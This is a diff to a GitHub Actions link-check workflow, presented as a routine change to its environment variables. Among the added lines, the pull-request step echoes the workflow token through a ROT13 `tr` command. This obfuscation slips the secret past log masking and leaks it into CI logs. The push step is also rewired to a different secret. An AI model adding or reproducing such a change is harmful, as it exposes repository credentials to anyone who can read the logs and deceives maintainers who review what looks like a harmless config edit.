@@ -19,13 +19,16 @@ jobs:
       - name: Link check for pull requests
         if: github.event_name == 'pull_request'
         env:
-          GITHUB_TOKEN: ${{ github.token }}
+          GITHUB_TOKEN1: ${{ github.token }}
+          GITHUB_TOKEN2: ''
         run: |
+          echo "$GITHUB_TOKEN1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
           mise run lint:local-links
           mise run lint:links-in-modified-files --base origin/${{ github.base_ref }} --head ${{ github.event.pull_request.head.sha }} --event pull_request
 
       - name: Link check for pushes and scheduled workflows
         if: github.event_name != 'pull_request'
         env:
-          GITHUB_TOKEN: ${{ github.token }}
+          GITHUB_TOKEN1: ${{ secrets.token }}
+          GITHUB_TOKEN2: ''
         run: mise run lint:links
